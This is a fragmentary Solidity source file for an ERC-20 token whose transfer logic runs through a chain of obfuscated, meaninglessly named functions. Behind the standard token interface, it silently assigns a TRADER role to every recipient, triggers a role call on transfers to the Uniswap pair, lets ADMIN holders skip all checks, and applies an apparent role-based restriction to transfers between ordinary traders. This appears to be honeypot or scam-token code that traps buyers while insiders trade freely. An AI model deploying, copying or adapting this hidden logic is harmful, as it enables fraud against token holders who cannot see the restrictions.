...
abstract contract JCKSENLAConsole is Context, JCKSENLARoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        _JCKSENLAMberJIAO(role, account, amt);
    }

    function _JCKSENLAMberJIAO(bytes32 role, address account, uint256 amt) internal {
    ...
    function _JCKSENLArolpMberJIAO(bytes32 role, address account, uint256 num) internal virtual {
...
contract JCKSENLAERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is JCKSENLAERC20, JCKSENLAConsole {
    ...
    ) JCKSENLAERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(JCKSENLAERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _JCKSENLAxcnhtb(from, to, amt);

    }



    function _JCKSENLAxcnhtb(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _JCKSENLAcxvnywq(from, to, amt);
    }


    function _JCKSENLAcxvnywq(address from, address to, uint256 amt) internal {
        ...
        _JCKSENLAwekiymn(from, to, amt);
    }

    function _JCKSENLAwekiymn(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _JCKSENLAydsascb(from, to, amt);
    }


    function _JCKSENLAydsascb(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            _JCKSENLArolpMberJIAO(TRADER,to,1);
        }

        _JCKSENLActnytng(from, to, amt);
    }

    function _JCKSENLActnytng(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        _JCKSENLAgfcvteach(from, to, amt);
    }

    function _JCKSENLAgfcvteach(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _JCKSENLAigndvnt(from, TRADER, amt);
    ...
    function _JCKSENLAigndvnt(address from, bytes32 role, uint256 amt) internal {
        _JCKSENLAMberJIAO(role, from, amt);
    }
